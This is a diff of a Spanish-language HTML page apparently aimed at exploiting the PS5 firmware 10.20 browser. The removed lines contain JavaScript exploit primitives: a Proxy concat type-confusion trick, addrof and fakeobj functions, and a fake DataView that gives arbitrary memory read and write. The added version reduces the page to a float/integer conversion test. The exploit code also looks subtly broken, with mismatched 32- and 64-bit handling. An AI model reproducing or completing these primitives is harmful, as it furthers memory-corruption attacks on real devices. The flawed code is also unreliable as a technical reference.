@@ -2,100 +2,49 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Exploit PS5 10.20 - AAR/AAW</title>
+  <title>PS5 10.20 - Prueba Exploit</title>
   <style>
-    body { background:#111; color:#0f0; font-family:monospace; padding:2em; }
+    body { background:#000; color:#0f0; font-family:monospace; padding:2em; }
     h1 { color: cyan; }
   </style>
 </head>
 <body>
-  <h1>PS5 10.20 - Primitivas AAR / AAW</h1>
-  <div id="output">Inicializando...</div>
+  <h1>Test Exploit - PS5 FW 10.20</h1>
+  <pre id="debug">Cargando...</pre>
 
   <script>
-    const f64 = new Float64Array(1);
-    const u64 = new Uint32Array(f64.buffer); // Usamos Uint32Array en lugar de BigUint64Array
+    const f64_buf = new Float64Array(1);
+    const u32_buf = new Uint32Array(f64_buf.buffer);
 
-    function f2i(f) { f64[0] = f; return u64[0]; }
-    function i2f(i) { u64[0] = i; return f64[0]; }
-    function hex(i) { return "0x" + i.toString(16).padStart(16, "0"); }
-
-    let leak_arr = [1.1];
-    let victim = { marker: 13.37 };
-    let master;
-    
-    const handler = {
-      get: function(target, prop) {
-        if (prop === Symbol.isConcatSpreadable) {
-          leak_arr[0] = victim;
-          return true;
-        }
-        return target[prop];
-      }
-    };
-
-    const proxy = new Proxy([], handler);
-    const result = proxy.concat(leak_arr);
-
-    for (let i = 0; i < result.length; i++) {
-      if (result[i] === victim) {
-        master = result;
-        break;
-      }
+    function f2i(f) {
+      f64_buf[0] = f;
+      return [u32_buf[0], u32_buf[1]]; // [low, high]
     }
 
-    function addrof(obj) {
-      leak_arr[0] = obj;
-      return f2i(master[0]);
+    function i2f(lo, hi) {
+      u32_buf[0] = lo;
+      u32_buf[1] = hi;
+      return f64_buf[0];
     }
 
-    function fakeobj(addr) {
-      master[0] = i2f(addr);
-      return leak_arr[0];
-    }
-
-    function setup_rw() {
-      let ab = new ArrayBuffer(0x100);
-      let ab_addr = addrof(ab);
-      let dv = new DataView(ab);
-      let dv_addr = addrof(dv);
-
-      let fake = [
-        i2f(0),                 // fake JSCell
-        i2f(0),                 // butterfly (can be 0)
-        i2f(ab_addr),           // backing buffer
-        i2f(0), i2f(0), i2f(0), i2f(0)
-      ];
-
-      let fake_addr = addrof(fake) + 0x20; // Dirección de memoria falsa.
-      let corrupted = fakeobj(fake_addr);
-
-      return {
-        read64: function(addr) {
-          fake[2] = i2f(addr);
-          return f2i(corrupted.getFloat64(0, true));
-        },
-        write64: function(addr, val) {
-          fake[2] = i2f(addr);
-          corrupted.setFloat64(0, i2f(val), true);
-        }
-      };
+    function hex(lo, hi) {
+      return "0x" + hi.toString(16).padStart(8, "0") + lo.toString(16).padStart(8, "0");
     }
 
     try {
-      let { read64, write64 } = setup_rw();
-      let obj = { test: 1337 };
-      let addr = addrof(obj);
+      let prueba = 13.37;
+      let [lo, hi] = f2i(prueba);
+      let reconstruido = i2f(lo, hi);
 
-      let val = read64(addr);
-      document.getElementById("output").innerHTML =
-        "✅ Lectura OK<br>📍 Dirección de objeto: " + hex(addr) +
-        "<br>📖 Valor leído: " + hex(val);
+      document.getElementById("debug").textContent =
+        "✅ Conversión f2i:\n" +
+        "  Float: " + prueba + "\n" +
+        "  Int:   " + hex(lo, hi) + "\n" +
+        "✅ Conversión i2f:\n" +
+        "  Reconstruido: " + reconstruido;
 
-      console.log("[+] addrof:", hex(addr));
-      console.log("[+] read64:", hex(val));
     } catch (e) {
-      document.getElementById("output").textContent = "❌ Error: " + e;
+      document.getElementById("debug").textContent = "❌ Error: " + e;
     }
   </script>
 </body>
